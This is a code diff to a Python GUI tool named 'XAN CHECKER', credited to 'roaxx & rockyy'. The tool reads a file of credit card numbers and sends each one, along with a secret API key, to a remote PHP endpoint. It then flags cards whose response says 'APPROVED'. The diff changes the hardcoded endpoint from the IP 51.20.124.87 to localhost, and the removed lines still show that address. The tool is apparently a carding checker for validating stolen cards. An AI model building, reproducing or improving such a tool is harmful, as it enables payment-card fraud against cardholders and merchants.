@@ -10,7 +10,7 @@ import requests
 
 def icon():
     result_text.config(state='normal')
-    result_text.insert('insert', '                    v1.2\n', 'title')
+    result_text.insert('insert', '                      v4.1 API - TOOL v1.2\n', 'title')
     result_text.insert('insert', '               [ XAN CHECKER ]\n', 'title')
     result_text.insert('insert', '\n', 'title')
     result_text.insert('insert', '             by roaxx & rockyy\n', 'title')
@@ -26,7 +26,7 @@ def check_cc():
         with open(cc_file, 'r') as requests_file:
             for line in requests_file:
                 cx = line.strip()
-                url = f"http://51.20.124.87/man.php?sk={sk_key}&cc={cx}"  # live api
+                url = f"http://localhost/man.php?sk={sk_key}&cc={cx}"  # live api
                 try:
                     response = requests.get(url, verify=False)
                     if "APPROVED" in response.text:
@@ -63,7 +63,7 @@ def check_cc():
         with open(cc_file, 'r') as requests_file:
             for line in requests_file:
                 cx = line.strip()
-                url = f"http://51.20.124.87/xan2.php?cc={cx}"  # 2update soon
+                url = f"http://localhost/api.php?cc={cx}"  # 2update soon
                 try:
                     response = requests.get(url, verify=False)
                     if "APPROVED" in response.text:
